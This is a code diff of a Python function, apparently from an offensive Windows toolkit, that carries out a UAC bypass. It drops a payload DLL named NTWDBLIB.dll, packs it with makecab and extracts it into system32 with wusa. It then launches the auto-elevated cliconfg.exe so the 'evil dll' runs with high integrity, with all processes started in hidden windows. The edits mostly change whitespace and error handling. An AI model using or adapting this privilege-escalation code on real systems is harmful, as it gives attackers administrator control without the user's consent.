@@ -14,7 +14,7 @@ def cliconfg(payload):
 	print """
  -------------------------------------------------------------
  cliconfg.exe is an auto-elevated binary that attempts to
- load dll files which is not present in system32 folder. By
+ load dll files which is not present in system32 folder. By 
  placing our own dll file in system32 directory will make
  the application load our evil dll file
  
@@ -22,7 +22,7 @@ def cliconfg(payload):
  spawned with high IL.
  -------------------------------------------------------------
  """
-
+ 
 	"""
 	Save the DLL file to temp directory
 	"""
@@ -56,8 +56,8 @@ def cliconfg(payload):
 	print_info("Attempting to create cabinet file")
 	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll")) == True):
 		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll"),
-							os.path.join(tempfile.gettempdir(),"suspicious.cab")),
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+											os.path.join(tempfile.gettempdir(),"suspicious.cab")),
+											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 		
 		time.sleep(5)
 
@@ -66,13 +66,12 @@ def cliconfg(payload):
 			try:
 				os.remove(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll"))
 			except Exception as error:
+				print_error("Unable to create cabinet file")
 				return False
 		else:
 			print_error("Unable to create cabinet file")
-			return False
 	else:
 		print_error("Unable to create cabinet file, the payload is not present in: {}".format(tempfile.gettempdir()))
-		return False
 	
 	print_info("Pausing for 5 seconds before extracting the cabinet file")
 	time.sleep(5)
@@ -85,7 +84,7 @@ def cliconfg(payload):
 	print_info("Attempting to extract the cabinet file")
 	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
 		wusa = wmi.Win32_Process.Create(CommandLine="cmd.exe /c wusa {} /extract:{} /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),system_directory()),
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 		
 		time.sleep(5)
 
@@ -94,6 +93,7 @@ def cliconfg(payload):
 			try:
 				os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))
 			except Exception as error:
+				print_error("Unable to extract cabinet file")
 				return False
 		else:
 			print_error("Unable to extract cabinet file")
@@ -107,10 +107,10 @@ def cliconfg(payload):
 	
 	"""
 	Run the executable to trigger the DLL
-	"""		
+	"""	
 	print_info("Attempting to run cliconfg executable")
 	cliconfg = wmi.Win32_Process.Create(CommandLine="cmd.exe /c {}\cliconfg.exe".format(system_directory()),
-						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 				
 	time.sleep(5)
 
